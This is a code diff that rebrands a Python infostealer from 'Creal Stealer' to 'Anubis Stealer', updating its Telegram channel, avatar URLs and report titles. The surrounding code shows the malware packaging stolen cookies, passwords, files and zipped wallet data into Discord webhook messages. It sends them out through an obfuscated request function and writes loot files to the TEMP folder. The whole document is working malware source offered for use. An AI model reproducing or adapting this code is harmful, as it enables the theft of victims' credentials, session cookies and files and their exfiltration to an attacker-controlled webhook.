@@ -546,17 +546,17 @@ def upload(name, link):
             "content": f"{globalInfo()}",
             "embeds": [
                 {
-                    "title": "Creal | Cookies Stealer",
+                    "title": "Anubis | Cookies Stealer",
                     "description": f"<:apollondelirmis:1012370180845883493>: **Accounts:**\n\n{rb}\n\n**Data:**\n<:cookies_tlm:816619063618568234> • **{CookiCount}** Cookies Found\n<a:CH_IconArrowRight:715585320178941993> • [CrealCookies.txt]({link})",
                     "color": 2895667,
                     "footer": {
-                        "text": "Creal Stealer | https://t.me/CrealStealer",
-                        "icon_url": "https://raw.githubusercontent.com/Ayhuuu/Creal-Stealer/main/img/xd.jpg"
+                        "text": "Anubis Stealer | https://t.me/AnubisNetworkk",
+                        "icon_url": "https://images-ext-2.discordapp.net/external/A6VFzyqsfSGAaG3xdZOFAAI0DlOe8XouFTqbU1koOzo/%3Fsize%3D4096/https/cdn.discordapp.com/icons/1194296697065590905/9c7e3c64af7413e02caa6968c01d4ffc.png"
                     }
                 }
             ],
-            "username": "Creal Stealer",
-            "avatar_url": "https://raw.githubusercontent.com/Ayhuuu/Creal-Stealer/main/img/xd.jpg",
+            "username": "Anubis Stealer",
+            "avatar_url": "https://images-ext-2.discordapp.net/external/A6VFzyqsfSGAaG3xdZOFAAI0DlOe8XouFTqbU1koOzo/%3Fsize%3D4096/https/cdn.discordapp.com/icons/1194296697065590905/9c7e3c64af7413e02caa6968c01d4ffc.png",
             "attachments": []
             }
         L04durl1b(wh00k, data=dumps(data).encode(), headers=headers)
@@ -572,17 +572,17 @@ def upload(name, link):
             "content": f"{globalInfo()}",
             "embeds": [
                 {
-                    "title": "Creal | Password Stealer",
+                    "title": "Anubis | Password Stealer",
                     "description": f"<:apollondelirmis:1012370180845883493>: **Accounts**:\n{ra}\n\n**Data:**\n<a:hira_kasaanahtari:886942856969875476> • **{P4sswCount}** Passwords Found\n<a:CH_IconArrowRight:715585320178941993> • [CrealPassword.txt]({link})",
                     "color": 2895667,
                     "footer": {
-                        "text": "Creal Stealer | https://t.me/CrealStealer ",
-                        "icon_url": "https://raw.githubusercontent.com/Ayhuuu/Creal-Stealer/main/img/xd.jpg"
+                        "text": "Anubis Stealer | https://t.me/AnubisNetworkk ",
+                        "icon_url": "https://images-ext-2.discordapp.net/external/A6VFzyqsfSGAaG3xdZOFAAI0DlOe8XouFTqbU1koOzo/%3Fsize%3D4096/https/cdn.discordapp.com/icons/1194296697065590905/9c7e3c64af7413e02caa6968c01d4ffc.png"
                     }
                 }
             ],
-            "username": "Creal",
-            "avatar_url": "https://raw.githubusercontent.com/Ayhuuu/Creal-Stealer/main/img/xd.jpg",
+            "username": "Anubis",
+            "avatar_url": "https://images-ext-2.discordapp.net/external/A6VFzyqsfSGAaG3xdZOFAAI0DlOe8XouFTqbU1koOzo/%3Fsize%3D4096/https/cdn.discordapp.com/icons/1194296697065590905/9c7e3c64af7413e02caa6968c01d4ffc.png",
             "attachments": []
             }
         L04durl1b(wh00k, data=dumps(data).encode(), headers=headers)
@@ -601,16 +601,16 @@ def upload(name, link):
                     }
                 ],
                 "author": {
-                    "name": "Creal | File Stealer"
+                    "name": "Anubis | File Stealer"
                 },
                 "footer": {
-                    "text": "Creal Stealer | https://t.me/CrealStealer ",
-                    "icon_url": "https://raw.githubusercontent.com/Ayhuuu/Creal-Stealer/main/img/xd.jpg"
+                    "text": "Anubis Stealer | https://t.me/AnubisNetworkk ",
+                    "icon_url": "https://images-ext-2.discordapp.net/external/A6VFzyqsfSGAaG3xdZOFAAI0DlOe8XouFTqbU1koOzo/%3Fsize%3D4096/https/cdn.discordapp.com/icons/1194296697065590905/9c7e3c64af7413e02caa6968c01d4ffc.png"
                 }
                 }
             ],
-            "username": "Creal Stealer",
-            "avatar_url": "https://raw.githubusercontent.com/Ayhuuu/Creal-Stealer/main/img/xd.jpg",
+            "username": "Anubis Stealer",
+            "avatar_url": "https://images-ext-2.discordapp.net/external/A6VFzyqsfSGAaG3xdZOFAAI0DlOe8XouFTqbU1koOzo/%3Fsize%3D4096/https/cdn.discordapp.com/icons/1194296697065590905/9c7e3c64af7413e02caa6968c01d4ffc.png",
             "attachments": []
             }
         L04durl1b(wh00k, data=dumps(data).encode(), headers=headers)
@@ -626,7 +626,7 @@ def upload(name, link):
 def wr1tef0rf1l3(data, name):
     path = os.getenv("TEMP") + f"\cr{name}.txt"
     with open(path, mode='w', encoding='utf-8') as f:
-        f.write(f"<--Creal STEALER BEST -->\n\n")
+        f.write(f"<--anubis STEALER BEST -->\n\n")
         for line in data:
             if line[0] != '':
                 f.write(f"{line}\n")
@@ -795,17 +795,17 @@ def GatherZips(paths1, paths2, paths3):
         "content": globalInfo(),
         "embeds": [
             {
-            "title": "Creal Zips",
+            "title": "Anubis Zips",
             "description": f"{wal}\n{ga}\n{ot}",
             "color": 2895667,
             "footer": {
-                "text": "Creal Stealer | https://t.me/CrealStealer",
-                "icon_url": "https://raw.githubusercontent.com/Ayhuuu/Creal-Stealer/main/img/xd.jpg"
+                "text": "Anubis Stealer | https://t.me/AnubisNetworkk",
+                "icon_url": "https://images-ext-2.discordapp.net/external/A6VFzyqsfSGAaG3xdZOFAAI0DlOe8XouFTqbU1koOzo/%3Fsize%3D4096/https/cdn.discordapp.com/icons/1194296697065590905/9c7e3c64af7413e02caa6968c01d4ffc.png"
             }
             }
         ],
-        "username": "Creal Stealer",
-        "avatar_url": "https://raw.githubusercontent.com/Ayhuuu/Creal-Stealer/main/img/xd.jpg",
+        "username": "Anubis Stealer",
+        "avatar_url": "https://images-ext-2.discordapp.net/external/A6VFzyqsfSGAaG3xdZOFAAI0DlOe8XouFTqbU1koOzo/%3Fsize%3D4096/https/cdn.discordapp.com/icons/1194296697065590905/9c7e3c64af7413e02caa6968c01d4ffc.png",
         "attachments": []
     }
     L04durl1b(wh00k, data=dumps(data).encode(), headers=headers)
